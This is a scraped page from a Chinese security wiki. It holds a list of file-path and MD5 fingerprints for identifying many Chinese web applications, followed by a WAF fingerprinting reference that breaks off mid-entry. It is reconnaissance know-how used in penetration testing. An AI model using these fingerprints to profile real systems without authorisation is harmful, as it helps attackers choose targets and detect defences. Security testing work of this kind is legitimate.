宁志学校网站系统\\ cdc5b2704e4589c1c19eae4b1ebbd2bc /themes/blue2012/images/xj_sprite.png\\ 安乐业房产系统\\ f620a400b01b3478be57fcf500ed7a1e /Admin_Management/upload/desk.gif\\ 小计天空进销存管理系统\\ 5bbe8944d28ae0eb359f4d784a4c73cc /404/emessage.gif\\ 尘月企业网站管理系统\\ ca9df517967dff061720627b8cdbcdcd /Admin_Cy/Script/xselect.js\\ 尘月企业网站管理系统\\ d19527099c311ad7368bae069d47f870 /ADMIN/IMAGES/number.gif\\ 尘缘雅境图文系统\\ e9d28857edfe55ff3b5b4cc75e3dbf7e /ADMIN/IMAGES/underline.gif\\ 尘缘雅境图文系统\\ cf9b1b4248c438dbc0edd4225910e04d /article/ADMIN/IMAGES/number.gif\\ 尘缘雅境图文系统\\ e9d28857edfe55ff3b5b4cc75e3dbf7e /article/ADMIN/IMAGES/underline.gif\\ 尘缘雅境图文系统\\ cf9b1b4248c438dbc0edd4225910e04d /admin/images/watermark.png\\ 建站之星\\ 7908983ef3f775218c91421475ce0b00 /admin/images/watermark.png\\ 建站之星\\ cded8ff39d38bbb9aaf4fe2e14a8678a /admin/template/images/site_logo.png\\ 建站之星\\ 4adf959f86cd4215c464913317000139 /admin/template/images/site_logo.png\\ 建站之星\\ a9a0fdda4e22adb443c3fa14b97af0ea /data/adtool/theme/d2.jpg\\ 建站之星\\ 48794b6ad154b3311c9cda372ebf7cdc /data/adtool/theme/d2.jpg\\ 建站之星\\ 4b5335fe73f0b3435e0aef292f020d14 /images/wp-background-preview-bg.gif\\ 建站之星\\ b062ecc58a45fc789ae720ed5b20328f /images/wp-background-preview-bg.gif\\ 建站之星\\ b97226d43b397617b566ce1f68077343 /install/images/logo.gif\\ 建站之星\\ 91ff80fe4f2cf7a3989f6304bbb14771 /install/images/logo.gif\\ 建站之星\\ ac85215d71732d34af35a8e69c8ba9a2 /web/resource/images/gw-logo.png\\ 微擎科技\\ 9b877fc8ca3323a3d45ca59c6a795da8 /web/resource/images/success-small.png\\ 微擎科技\\ c37818f25d5906f5de44bea32ef09878 /public/ico/favicon.png\\ 悟空CRM\\ 834089ffa1cd3a27b920a335d7c067d7 /public/js/php/file_manager_json.php\\ 悟空CRM\\ c64fd0278d72826eb9041773efa1f587 /App_Themes/theme1/images/main-panel-h3_bg.gif\\ 擎天政务系统\\ c551ede265d39b01c446b1ab4cdd924e /App_Themes/theme1/images/rightContent-header_bg.gif\\ 擎天政务系统\\ 3b4a5a98f9a95d79e7f780afa2ded34c /App_Themes/theme1/images/ui-btn_yellow.gif\\ 擎天政务系统\\ 862df2aafc3bae92bc4c61db931706cd /customize/nwc_755_newvexam_blue/login/images/btn_login.gif\\ 新为软件E-learning管理系统\\ b1ccaa112d5f1df79309849cb40ae4d2 /customize/nwc_755_newvlms_default/login/images/newvlogo.gif\\ 新为软件E-learning管理系统\\ f4cfd682c3d1f75e1a017047855af644 /admin/system/images/login_background.jpg\\ 新秀\\ 30a5688a2f27981c0c2f54f796cbc9df /admin/system/images/login_background.jpg\\ 新秀\\ e8b3ae50334b4d5b91f9acb0d00fb4b7 /Public/img_loading.gif\\ 方维团购\\ 3edd33d7d8bb036bed23ebb4f4c6281a /Public/img_loading.gif\\ 方维团购\\ 9f8edf2baf2d0b7920565037e5110e98 /assistant/logs/ReadMe.txt\\ 方维团购\\ 059a107303f949d87257e92240659e1c /favicon.ico\\ 方维团购\\ 4cf3a72922a380146e6be929a1728351 /global/kindeditor/plugins/image/images/align_left.gif\\ 方维团购\\ 41e066e74f2fa9105700dbdf4e4905c5 /global/kindeditor/plugins/image/images/refresh.gif\\ 方维团购\\ 0f131c753498d9dbf621a24a839aeb56 /robots.txt\\ 方维团购\\ ba9a665ec42c67139fd4dc564a407e75 /admin/Tpl/Default/Static/Js/jquery.js\\ 方维团购购物分享系统\\ b372b12089d93c6516eeda98d4a1873d /favicon.ico\\ 时代企业邮\\ c1c1a7d9cca179ad5c0518e9c4641232 /webmail/template/3/images/login.jpg\\ 时代企业邮\\ 10e824bee8714c6dfe0acab200099e58 /webmail/template/default/images/logo.jpg\\ 时代企业邮\\ dc1aeffe26c99ddc0c8a5b102be16214 /BackOffice/images/logo.png\\ 明腾CMS\\ 1f47a98a538398477bc0c3cf1d04d0a5 /backoffice/favicon.ico\\ 明腾CMS\\ 2488a216fc8480467e5d479402672fdd /Images/System/greyline01.gif\\ 易创思(ECS)教学系统\\ 37544c09f006b6622692d46419dc2568 /images/addAlbum_icon.gif\\ 易创思(ECS)教学系统\\ 08fe79b4254b0e45d91a6c657c8bc33e /Manage/TreeNodeImg/icon01.gif\\ 易创思教育建站系统\\ 7e2f7a410b54ef80399954293c3e45ca /images/tab_tit.jpg\\ 易创思教育建站系统\\ 4f5ed0ede3b0ba91770f5612be97aa18 /admin/images/admin_left_6.gif\\ 易想CMS\\ bf440120c9099b643af6a0e7c5a649a5 /login/images/toolbar_back2.gif\\ 易想CMS\\ 898b4bda594e8da78ad4d9613b4fc2e8 /member/images/bodyleft.gif\\ 易想CMS\\ c6a05e162821f56456eafcd9bcd30625 /images/Arrow_02.gif\\ 智睿网站系统\\ cc39fd62e6a878c6c1d2180b54179ffe /images/t4.gif\\ 智睿网站系统\\ 79d3d57a9400c1849ecd0409b8fa46b1 /robots.txt\\ 最土团购系统\\ 576efd14be2e01458e5eca53d0aac974 /static/css/i/bg-box-702.gif\\ 最土团购系统\\ ffaaa1573db8a6910d06e314237350a5 /static/icon/favicon.ico\\ 最土团购系统\\ 1c67f36a3a9547ecc26dd25c0a5a57b3 /cn/base/css/local/images/index-top-bg.gif\\ 未知OEM安防监控系统\\ 53c3336e1c713de2b47772d994023d0d /cn/base/css/local/images/left-top-right.gif\\ 未知OEM安防监控系统\\ 0da9952b14fa33b30463e54ffb210ed2 /cn/base/css/local/images/top_bt.jpg\\ 未知OEM安防监控系统\\ 2ea741e880d0d8b89f9509fa036fc9c6 /view/resource/images/ajax-loader.gif\\ 未知政府采购系统\\ 92791ce5da96fab331d49cd2c08c41c2 /view/resource/scripts/util/sysInfo.js\\ 未知政府采购系统\\ ceac723edc089519ba0b01c1b3e77d38 /view/resource/skin/skin.txt\\ 未知政府采购系统\\ 61a9910d6156bb5b21009ba173da0919 /view/resource/skin/skin.txt\\ 未知政府采购系统\\ a3417af84f448ab109e26f4aaa299415 /view/resource/skin/skin.txt\\ 未知政府采购系统\\ a480002efb18e6b0d143b78b9bd3ab7b /view/resource/skin/skin05/img/icon/changeSkin_titleBg.png\\ 未知政府采购系统\\ c52a3c5c1d0c7065c585490ef6ab5119 /view/resource/skin/skin05/img/login_bg.png\\ 未知政府采购系统\\ 25495fa955f13fb6d884dccd38115f35 /bbx/img/kuang1.gif\\ 未知查询系统\\ db0ebf565d93d8c37f51d61ec4fda7b8 /img/kuang1.gif\\ 未知查询系统\\ db0ebf565d93d8c37f51d61ec4fda7b8 /life/img/kuang1.gif\\ 未知查询系统\\ db0ebf565d93d8c37f51d61ec4fda7b8 /tool/img/kuang1.gif\\ 未知查询系统\\ db0ebf565d93d8c37f51d61ec4fda7b8 /tools/img/kuang1.gif\\ 未知查询系统\\ db0ebf565d93d8c37f51d61ec4fda7b8 /bocadmin/a/a.png\\ 杭州博采CMS\\ 7c61d0dd4009bf5a007ba0f8b2ab09d4 /bocadmin/a/b.png\\ 杭州博采CMS\\ b72430578773338d0b7de75005f6535e /templates/admin/images/l_bg.gif\\ 杰奇小说连载系统\\ 8ce0605243964fddc5fe351a193b1911 /templates/admin/images/m_bgss.gif\\ 杰奇小说连载系统\\ 544a343fc29936d17da417917a06738a /images/logo.gif\\ 桃源相册管理系统\\ 4490f2ec8cb6483274db0124c7a30544 /admin/images/login_bgyin.gif\\ 汇成企业建站CMS\\ 74dbb894a8acd1529fe1b66600ce229f /admin/images/login_new.gif\\ 汇成企业建站CMS\\ 36b48346dc3d1f2169a606f2644a19ee /favicon.ico\\ 汇文图书馆书目检索系统\\ ed52bbd9b356b05a7fb1d2073a2f8bc4 /indexcss/default/hb_gb_o.gif\\ 汉码高校毕业生就业信息系统\\ 2ed7bf293b2e771ee4eb8cb37a33c907 /indexcss/default/icon1.gif\\ 汉码高校毕业生就业信息系统\\ ee85d13cc58a1b3b9400299c426b9b31 /favicon.ico\\ 泛微E-office\\ 9b1d3f08ede38dbe699d6b2e72a8febb /images/login/bg_top.png\\ 泛微E-office\\ c4ac80c8699333f3d34af74069626b40 /images/login/choose_lang_bg.png\\ 泛微E-office\\ 86483c8191dcbc6c8e3394db84ae2bdc /images/login/login_logo.png\\ 泛微E-office\\ dd482b50d4597025c8444a3f9c3de74d /images/login/login_text%20.png\\ 泛微E-office\\ 76aa04a85b1f3dea6d3215b27153e437 /webservice-xml/login/login.wsdl.php\\ 泛微E-office\\ e321f05b151d832859378c0b7eba081a /js/ext/resources/css/ext-all.css\\ 泛微OA\\ ccb7b72900a36c6ebe41f7708edb44ce /images/bluebuttonbg_hot.gif\\ 浪潮CMS\\ 08bf199ad68cd01fafeb957aeaf9055e /images/btn_bg1.gif\\ 浪潮CMS\\ c70d2c34b9305d87c6e6267887bd1c91 /images/logo.gif\\ 浪潮CMS\\ 8e111ed7ed44684c5a85be178841fa1c /resource/images/chaxunyello.gif\\ 浪潮CMS\\ a8d5f1ae2faafd17e3848c9ba0db2d5d /doc/images/login/input_normal.png\\ 海康威视\\ aa3905b0ece948af798deb6cad690b56 /doc/images/login/login_14.png\\ 海康威视\\ 0051c8e1d78d80d2b5b130a9988c544a /admin/skin/images/topbg.gif\\ 爱淘客\\ 24f88f73da8efb7eeb63b083166ccb98 /member/skin/images/level_10.gif\\ 爱淘客\\ 241b7b00c0f430a1317889607bba7ede /images/index_24.jpg\\ 爱装网\\ 75fd826a7697b9dbec065fbff1d9f545 /images/buttonImg/add.png\\ 用友FE协作办公平台\\ 0112820448f910acc5eedaa9625ab6b0 /images/widgetButtonBg.gif\\ 用友FE协作办公平台\\ 8f70211a3ce718b68c4adcd55edde612 /common/error/images/reminder_03.png\\ 用友FE管理系统\\ 8a37cb624c3bf09e14f0513ad186b0d3 /css/blue/fp_body_bg.gif\\ 用友TurBCRM系统\\ 4e3d5d23c53ef0fe03e6689d4140988b /js/ext/resources/css/xtheme-blue.css\\ 用友TurBCRM系统\\ dafa88a858c214b29d319bcf380752c4 /pic/logo-tw.png\\ 用友U8\\ 133ddfebd5e24804f97feb4e2ff9574b /Server/Images/b_b.gif\\ 用友\\ 6c52dd6d2ea7c2f38bf34f3fe9d64f74 /Server/Images/b_lb.gif\\ 用友\\ 8fd15d6ca8d16e32f29c338dc2aee593 /pic/an_01_a.png\\ 用友\\ 64515c1f99cbeaab109d8365ad48429d /pic/helpc1.png\\ 用友\\ 12794e52cf3c9d7cac9b2da7c7e5f9de /pic/logo.png\\ 用友\\ 0f9c8a9949b6613a8951f17b8320b816 /yyoa/images/login/dl.gif\\ 用友\\ 4cbf844456fcf951d350ea39511ddfe6 /Inedu3In1/images/default/images/2.gif\\ 皓翰通用数字化校园平台\\ b5bcd111fefb3b664870d5dc265a9f29 /Inedu3In1/images/default/images/arrow_04.gif\\ 皓翰通用数字化校园平台\\ c1cc4ac59dd326e6dc8314076141f0ed /Inedu3In1/images/default/images/button_go.gif\\ 皓翰通用数字化校园平台\\ 1c78cecd50ec368df018b8d9952db8f8 /Images/gongs.gif\\ 省级农机构置补贴信息管理系统\\ 17ff1035c4c68d9134ed51c0149beaa3 /images/login_01.jpg\\ 省级农机构置补贴信息管理系统\\ 165f9dc0c5bc08aea63ab52f6d0d9526 /images/login_07.jpg\\ 省级农机构置补贴信息管理系统\\ 5bcf8375f681bbbc2055dccfb5db7047 /images/small_loader.gif\\ 科信邮件系统\\ daf18c5edc5cb661c255f0c96bddf60f /server/images/logo.gif\\ 科迈RAS\\ 6fff06dc129824dbafa5dda0e3f89a9b /attachment/logo.png\\ 程氏舞曲CMS\\ 5ff0a28bc1d68f21b4ae8bc07cab9e7f /attachment/nv_nopic.jpg\\ 程氏舞曲CMS\\ 03cae9e3bc2ecf299278851e7757c5ad /csdj/admin/images/close.gif\\ 程氏舞曲CMS\\ 702f29bd25f306144af3709da988bcea /favicon.ico\\ 程氏舞曲CMS\\ b52600e43c568a77eb3e3322b1b88bf4 /robots.txt\\ 程氏舞曲CMS\\ 141b4a97da5ce023786ca66e7b76916c /skins/user/default/images/trend-icons.png\\ 程氏舞曲CMS\\ 11fb4285d2afa2af10f65a6f631b7ff3 /skins/user/default/images/wrong.gif\\ 程氏舞曲CMS\\ 735238164516393c7819fb43c28ce991 /style/jbox/skins/currently/images/jbox-close1.gif\\ 绿麻雀借贷系统\\ 7aaa517d007c879e98c4a0753083b978 /style/jbox/skins/currently/images/jbox-content-loading.gif\\ 绿麻雀借贷系统\\ afde18707b365c67e4708775650a37ba /style/tip/images/tip.png\\ 绿麻雀借贷系统\\ e55c803f51b20bd37bc7a08c0b62f8bb /admin/images/index_hz01.gif\\ 网趣商城\\ 6b1188ee1f8002a8e7e15dffcfcbb5df /admin/images/logo.png\\ 网趣商城\\ 975e13ee70b6c4ac22bc83ebe3f0c06b /images/admin_bg_1.gif\\ 网趣商城\\ 3382b05d5f02a4659d044128db8900c7 /images/small/m_replyp.gif\\ 网趣商城\\ 4c23f42e418b898ecebcf7b6aea95250 /upFiles/images/thumb_2011010241734953.jpg\\ 网钛文章管理系统\\ 9e35d469dc910300cc7b37e40510e99f /upFiles/images/thumb_2011010241734953.jpg\\ 网钛文章管理系统\\ c6bb2d26d9432d37ac8c2cc5347b12e3 /Admin/images/login_r4_c4_r1_c1.jpg\\ 老Y文章管理系统\\ c4a0f335ab0466906a5d42d4e0e34586 /Admin/images/login_r4_c4_r1_c1.jpg\\ 老Y文章管理系统\\ eda07be3c5fb86a69170676cc7a7567c /Admin/images/right.gif\\ 老Y文章管理系统\\ 563080e6343992d6425ac89ddf8ab314 /Admin/images/right.gif\\ 老Y文章管理系统\\ 809224aed562bd15265e57747425bec9 /Admin/images/t2_r1_c5.jpg\\ 老Y文章管理系统\\ 3dcec1078aebe088e3b6881bf78ade2e /Admin/images/t2_r1_c5.jpg\\ 老Y文章管理系统\\ daf04071f5c77bb25a3cbe1c856f9c00 /App_Themes/default/images/bodybg1.gif\\ 联众Mediinfo医院综合管理平台\\ ed81815c304a003fb41aaae7610493b3 /tpl/green/common/images/notebg.jpg\\ 自动发卡平台\\ 690f337298c331f217c0407cc11620e9 /tpl/new/images/button_search.gif\\ 自动发卡平台\\ bcb665cd94196850b271acb46e73193c /admin/Image/Login_tit.gif\\ 良精南方\\ 352483c5ff2f284d92b38a9fab80cfcb /admin/image/title.gif\\ 良精南方\\ 48015513094ff91334f8974f5dc123ad /favicon.ico\\ 艺帆CMS\\ 6561b03b969300a5575592c78b6f4cc4 /images/i_arrow.gif\\ 菲斯特诺期刊系统\\ 104867e9a97c512a74dd4724d6dcdffd /images/more27.gif\\ 菲斯特诺期刊系统\\ dfd912127abc1e2b27505fc52cee6854 /images/tt.gif\\ 菲斯特诺期刊系统\\ 4F08B4951AACFA3C8BCC74BE8596F0AD /images/tt.gif\\ 菲斯特诺期刊系统\\ 4c1a973b15d26bf1dac2d0c72a63ce90 /App_Themes/Login/default/images/bg_form_TL.png\\ 蓝凌EIS智慧协同平台\\ d2093064429e9062da93a66c644d0b26 /App_Themes/Login/default/images/logo.png\\ 蓝凌EIS智慧协同平台\\ 3b8f451cf5006971dc0b7fa20abd7809 /admin/images/left_title.gif\\ 蓝科CMS\\ 35613297cc0e20d5af99f7db02b877a2 /admin/images/left_title2.gif\\ 蓝科CMS\\ f31bb2f1b0a0b21bca18a0ba4943609c /admin/img/login1.gif\\ 薄冰时期网站管理系统\\ 5d4557c6d09e6b156705d436990f3b7c /images/1012.gif\\ 讯时网站管理系统cms\\ 9fa0ca8c310b20af5671f0ce4d0a0567 /templates/default/admin/images/alert.png\\ 记事狗\\ dd77ab35bfe56104e640a2a365d2110c /templates/default/qunstyles/t1.css\\ 记事狗\\ 832e3939c83145e1b7b5ee9a155243bc /modules/member/index_ruizhict.php\\ 贷齐乐系统\\ d71aec693763f4e298e9724f3cda0afe /plugins/avatar/crossdomain.xml\\ 贷齐乐系统\\ 29c98250b07e4079f3906de984a27ef6 /plugins/avatar/images/locale.xml\\ 贷齐乐系统\\ 3108ff46cd72be64fa798c3c053c0ac1 /themes/ruizhict/images/bbs_bg_elc.png\\ 贷齐乐系统\\ 3c0c9d719e13298650f868220176a2eb /themes/ruizhict/images/user_menu_1.jpg\\ 贷齐乐系统\\ a6bd5d394f15cf2804b6a98528c74a2f /themes/ruizhict/js/base.js\\ 贷齐乐系统\\ 18a4f1f33fdb6bb9d8284dd37a0cf9bd /default/login_btn.png\\ 通达OA系统\\ 4d94103aa03e2a9af93030d7b1415b3b /images/tongda.ico\\ 通达OA系统\\ ab93346c1650acf2f16328fa41caf425 /images/tongda.ico\\ 通达OA系统\\ c615668494a4cc54601a06976c9ea408 /templates/default/logo.png\\ 通达OA系统\\ e4dc8e7460d6309186edb15e1099d6bf /theme/1/org_select.png\\ 通达OA系统\\ 535b29d2be57297c892d038f831a032d /theme/10/images/big_btn.png\\ 通达OA系统\\ 1d2b801dd2b6d7867ed76b6d46d82e9f /theme/10/images/icon64_error.png\\ 通达OA系统\\ 550054b45c5da9c275d60e1d163819e9 /App_Themes/Admin/admin_images/btn_bg.png\\ 速贝CMS\\ 39bb65a735ff068c3f83ae6b4430689d /App_Themes/Admin/admin_images/titlebg.jpg\\ 速贝CMS\\ efebbac3e2941d4e916f40544458be79 /App_Themes/admin/admin_images/login.jpg\\ 速贝CMS\\ bb0a2e312b75d0413b97331291151da5 /app_themes/admin/admin_images/login_tp.jpg\\ 速贝CMS\\ a38f595f434ba70b962d7bd27dc6b729 /admin/images/login/login_r3_c1.jpg\\ 金色校园\\ 47183c1b2cc64e61e9d4b7b0038f57a7 /kingdee/login/images/formTable_left.gif\\ 金蝶OA\\ 6608f7047b6738178c13ff4ddc5b51f3 /kingdee/login/images/logo-kingdee.gif\\ 金蝶OA\\ f71f48eb366561b9a868baf89c95cd82 /oa/errors/images/ico_fhsy.gif\\ 金蝶OA\\ e4cd63dfacdfbd8ce5377a19b7325936 /kingdee/images/login_bg.jpg\\ 金蝶协作办公系统\\ b0dafb425520fa98ed5342155f927a01 /kingdee/weboa/images/formtable_bg.gif\\ 金蝶协作办公系统\\ ab560312b75bd5c9f048c5ba98c19dfd /plugins/timepicker/WdatePicker.js\\ 金钱柜P2P\\ c9f6fa03efa814c0df575035774a0b6d /favicon.ico\\ 集时通讯程序\\ 8ba761dea4e805fc894763e895886656 /userweb/images/system/outbound_cloud_nologo/login_logo.jpg\\ 集时通讯程序\\ ea0ce234a64fb31b82fb20047530cc29 /userweb/images/tableft1.gif\\ 集时通讯程序\\ 8003e6104b2df85160c4ed1f75c76fed /adminimages/title.GIF\\ 露珠文章管理系统\\ 625f2078f5cc4bbffb4f1390f982b66b /images/luzhu.gif\\ 露珠文章管理系统\\ 9e6b211879d1b9c88f945b1a9afa38bf /images/ui/artlt_dot.png\\ 青云客CMS\\ 632173e3898d4c601c82630a36043730 /template/10001/cn/ui/logo.gif\\ 青云客CMS\\ 405279583d52c4ae53a985ef7edb2334 /admin/images/lg_fs.jpg\\ 青峰网络智能网站管理系统\\ 4b588db9466e935fcf6c9f0bfd0d67d6 /jwweb/images/button/bgbtn2_0.gif\\ 青果学生系统\\ a42f7524df1ebb718ae0fb992602ea87 /images/button/bgbtn2_0.gif\\ 青果学生综合系统\\ 061a9376bdb3bfaacfec43986456d455 /jwweb/images/button/bgbtn2_0.gif\\ 青果学生综合系统\\ 061a9376bdb3bfaacfec43986456d455 /xsweb/images/button/bgbtn2_0.gif\\ 青果学生综合系统\\ 061a9376bdb3bfaacfec43986456d455 /xsweb/images/button/bgbtn2_0.gif\\ 青果教务系统\\ a42f7524df1ebb718ae0fb992602ea87 /images/_m10.GIF\\ 青果软件教务系统\\ 5f18dc98d899dadec18bd506ff17f253 /images/_m10.GIF\\ 青果软件教务系统\\ a8d1da39a1384e09297eeba522f5e375 /images/index_border1.gif\\ 青果软件教务系统\\ 6847aab9eafaa3b18c9779ddf34f92e2 /images/index_border1.gif\\ 青果软件教务系统\\ 8d0ced0a7a86c239f84d4e33cbf178b9 /webs/sysdata.asmx\\ 青果软件教务系统\\ e259cdc8e7d3946d578ef8323476b245 /Admin/images/al_end_right.gif\\ 非凡建站\\ 27181f780a2c447a1d2a63ce70391b49 /Admin/images/al_top.gif\\ 非凡建站\\ aa157057bb0cdab1cf90454ffc362a8e /images/Jobs_resume_up.gif\\ 非凡建站\\ 041718edc41fb801317c3a0b1f4b7ca9 /qq/images/mid4.gif\\ 非凡建站\\ a2d236f6cf10df3342e017a8aea7de31 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-04 16:07:31 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"Tools/指纹/waf.html":{"url":"Tools/指纹/waf.html","title":"waf 指纹识别","keywords":"","body":"waf 指纹识别 WAF Fingerprints 360 Detectability: Easy Detection Methodology: Returns status code 493 upon unusual requests. Blockpage may contain reference to wzws-waf-cgi/ directory. Blocked response page source may contain: Reference to wangshan.360.cn URL. Sorry! Your access has been intercepted because your links may threaten website security. text snippet. Response headers may contain X-Powered-By-360WZB header. Blocked response headers contain unique header WZWS-Ray. Server header may contain value qianxin-waf. aeSecure Detectability: Moderate Detection Methodology: Blocked response content contains aesecure_denied.png image (view source to see). Response headers contain aeSecure-code value. Airlock Detectability: Moderate/Difficult Detection Methodology: Set-Cookie headers may contain: AL-SESS cookie field name (case insensitive). AL-LB value (case insensitive). Blocked response page contains: Server detected a syntax error in your request text. Check your request and all parameters text snippet. AlertLogic Detectability: Difficult Detection Methodology: Blocked response page contains: We are sorry, but the page you are looking for cannot be found text snippet. The page has either been removed, renamed or temporarily unavailable text. 404 Not Found in red letters. Aliyundun Detectability: Easy Detection Methodology: Blocked response page contains: Sorry, your request has been blocked as it may cause potential threats to the server's security text snippet. Reference to errors.aliyun.com site URL. Blocked response code returned is 405. Anquanbao Detectability: Easy Detection Methodology: Returns blocked HTTP response code 405 upon malicious requests. Blocked response content may contain /aqb_cc/error/ or hidden_intercept_time. Response headers contain X-Powered-by-Anquanbao header field. Anyu Detectability: Easy Detection Methodology: Blocked response content contains Sorry! your access has been intercepted by AnYu Blocked response page contains AnYu- the green channel text. Response headers may contain unusual header WZWS-RAY. Approach Detectability: Easy Detection Methodology: Blocked response page content may contain: Approach Web Application Firewall Framework heading. Your IP address has been logged and this information could be used by authorities to track you. warning. Sorry for the inconvenience! keyword. Approach infrastructure team text snippet. Server header has field value set to Approach. Armor Defense Detectability: Easy Detection Methodology: Blocked response content contains: This request has been blocked by website protection from Armor text. If you manage this domain please create an Armor support ticket snippet. ArvanCloud Detectability: Easy Detection Methodology: Server header contains ArvanCloud keyword. ASPA Detectability: Easy Detection Methodology: Server header contains ASPA-WAF keyword. Response contain unique header ASPA-Cache-Status with content HIT or MISS. ASP.NET Generic Detectability: Moderate Detection Methodology: Response headers may contain X-ASPNET-Version header value. Blocked response page content may contain: This generic 403 error means that the authenticated user is not authorized to use the requested resource. Error Code 0x00000000 Astra Detectability: Easy Detection Methodology: Blocked response page content may contain: Sorry, this is not allowed. in h1. our website protection system has detected an issue with your IP address and wont let you proceed any further text snippet. Reference to www.getastra.com/assets/images/ URL. Response cookies has field value cz_astra_csrf_cookie in response headers. AWS ELB Detectability: Moderate Detection Methodology: Response headers might contain: AWSALB cookie field value. X-AMZ-ID header. X-AMZ-REQUEST-ID header. Response page may contain: Access Denied in their keyword. Request token ID with length from 20 to 25 between RequestId tag. Server header field contains awselb/2.0 value. Baidu Yunjiasu Detectability: Moderate Detection Methodology: Server header may contain Yunjiasu-nginx value. Server header may contain Yunjiasu value. Barikode Detectability: Easy Detection Methodology: Blocked response page content contains: BARIKODE keyword. Forbidden Access text snippet in h1. Barracuda Detectability: Moderate Detection Methodology: Response cookies may contain barracounter_session value. Response headers may contain barracuda keyword. Response page contains: You have been blocked heading. You are unable to access this website text. Bekchy Detectability: Easy Detection Methodology: Blocked response headers contains Bekchy - Access Denied. Blocked response page contains reference to https://bekchy.com/report. BinarySec Detectability: Moderate Detection Methodology: Response headers contain: X-BinarySec-Via field. X-BinarySec-NoCache field. Server header contains BinarySec keyword. BitNinja Detectability: Easy Detection Methodology: Blocked response page may contain: Security check by BitNinja text snippet. your IP will be removed from BitNinja. Visitor anti-robot validation text snippet. (You will be challenged by a reCAPTCHA page) text. BIG-IP ASM Detectability: Moderate Detection Methodology: Response headers may contain BigIP or F5 keyword value. Response header fields may contain X-WA-Info header. Response headers might have jumbled X-Cnection field value. BlockDos Detectability: Moderate Detection Methodology: Server header contains value BlockDos.net. Bluedon IST Detectability: Easy Detection Methodology: Server header contains BDWAF field value. Blocked response page contains to Bluedon Web Application Firewall text snippet.. BulletProof Security Pro Detectability: Moderate Detection Methodology: Blocked response page contains: div with id as bpsMessage text snippet. If you arrived here due to a search or clicking on a link click your Browser's back button to return to the previous page. text snippet. CDN NS Application Gateway Detectability: Easy Detection Methodology: Blocked response page contains CdnNsWAF Application Gateway text snippet. Cerber (WordPress) Detectability: Difficult Detection Methodology: Blocked response page contains: We're sorry, you are not allowed to proceed text snippet. Your request looks suspicious or similar to automated requests from spam posting software warning. Chaitin Safeline Detectability: Difficult Detection Methodology: Blocked response page contains event_id keyword within HTML comments. ChinaCache Detectability: Easy Detection Methodology: Response headers contain Powered-by-ChinaCache field. Cisco ACE XML Gateway Detectability: Moderate Detection Methodology: Server header has value ACE XML Gateway set. Cloudbric Detectability: Moderate Detection Methodology: Response content contains: Malicious Code Detected heading. Your request was blocked by Cloudbric text snippet. Reference to https://cloudbric.zendesk.com URL. Cloudbric Help Center text. Page title starting with Cloudbric \\ ERROR!. Cloudflare Detectability: Easy Detection Methodology: Response headers might have cf-ray field value. Server header field has value cloudflare. Set-Cookie response headers have __cfuid= cookie field. Page content might have Attention Required! or Cloudflare Ray ID:. Page content may contain DDoS protection by Cloudflareas text. You may encounter CLOUDFLARE_ERROR_500S_BOX upon hitting invalid URLs. CloudfloorDNS Detectability: Easy Detection Methodology: Server header field has value CloudfloorDNS WAF. Block-page title might have CloudfloorDNS - Web Application Firewall Error. Page content may contain www.cloudfloordns.com/contact URL as a contact link. Cloudfront Detectability: Easy Detection Methodology: Blocked response content contains Generated by cloudfront (CloudFront) error upon malicious request. Comodo cWatch Detectability: Easy Detection Methodology: Server header contains Protected by COMODO WAF value. CrawlProtect Detectability: Easy Detection Methodology: Response cookies might contain crawlprotect cookie name. Block Page title has CrawlProtect keyword in it. Blocked response content contains value This site is protected by CrawlProtect !!! upon malicious request. Deny-All Detectability: Difficult Detection Methodology: Response content contains value Condition Intercepted. Set-Cookie header contains cookie field sessioncookie. Distil Web Protection Detectability: Easy Detection Methodology: Response headers contain field value X-Distil-CS in all requests. Blocked response page contains: Pardon Our Interruption... heading. You have disabled javascript in your browser. text snippet. Something about your browser made us think that you are a bot. text. DoSArrest Internet Security Detectability: Easy Detection Methodology: Response headers contain field value X-DIS-Request-ID. Server header contains DOSarrest keyword. DotDefender Detectability: Easy Detection Methodology: Blocked response content contains value dotDefender Blocked Your Request. Blocked response headers contain X-dotDefender-denied field value. DynamicWeb Injection Check Detectability: Easy Detection Methodology: Blocked response headers contain X-403-Status-By field with value dw-inj-check value. e3Learning Security Detectability: Easy Detection Methodology: Server header contains e3Learning_WAF keyword. EdgeCast (Verizon) Detectability: Easy Detection Methodology: Blocked response content contains value Please contact the site administrator, and provide the following Reference ID:EdgeCast Web Application Firewall (Verizon). Blocked response code returns 400 Bad Request on malicious requests. Eisoo Cloud Detectability: Easy Detection Methodology: Blocked response page content may contain: /eisoo-firewall-block.css reference. www.eisoo.com URL. © (year) Eisoo Inc. keyword. Server header has field value set to EisooWAF-AZURE/EisooWAF. Expression Engine Detectability: Difficult Detection Methodology: Blocked response page returns Invalid URI generally. Blocked response content contains value Invalid GET Request upon malicious GET queries. Blocked POST type queries contain Invalid Data in response content. F5 ASM Detectability: Difficult Detection Methodology: Blocked response content contains warning The requested URL was rejected. Please consult with your administrator. FortiWeb Detectability: Moderate Detection Methodology: Response headers contain FORTIWAFSID= on malicious requests. Blocked response page contains: Reference to .fgd_icon image icon. Server Unavailable! as heading. Server unavailable. Please visit later. as text. GoDaddy Detectability: Easy Detection Methodology: Blocked response page contains value Access Denied - GoDaddy Website Firewall. GreyWizard Detectability: Easy Detection Methodology: Blocked response page conatins: Grey Wizard as title. Contact the website owner or Grey Wizard text snippet. We've detected attempted attack or non standard traffic from your IP address text snippet. Server header contain greywizard keyword. Huawei Cloud Detectability: Easy Detection Methodology: Blocked response page contains: Reference to account.hwclouds.com/static/error/images/404img.jpg error image. Reference to www.hwclouds.com URL. Reference to hws_security@{site.tld} e-mail for reporting. HyperGuard Detectability: Difficult Detection Methodology: Set-Cookie header has cookie field ODSESSION= in response headers. IBM DataPower Detectability: Difficult Detection Methodology: Response headers contains field value value X-Backside-Transport with value OK or FAIL. Imperva Incapsula Detectability: Easy Detection Methodology: Blocked response page content may contain: Powered By Incapsula text snippet. Incapsula incident ID keyword. _Incapsula_Resource keyword. subject=WAF Block Page keyword. Normal GET request headers contain visid_incap value. Response headers may contain X-Iinfo header field name. Set-Cookie header has cookie field incap_ses and visid_incap. Immunify360 Detectability: Easy Detection Methodology: Server header contain imunify360-webshield keyword. Response page contains: Powered by Imunify360 text snippet. imunify360 preloader if response type is JSON. Blocked response page contains protected by Imunify360 text. IndusGuard Detectability: Moderate Detection Methodology: Server header contains 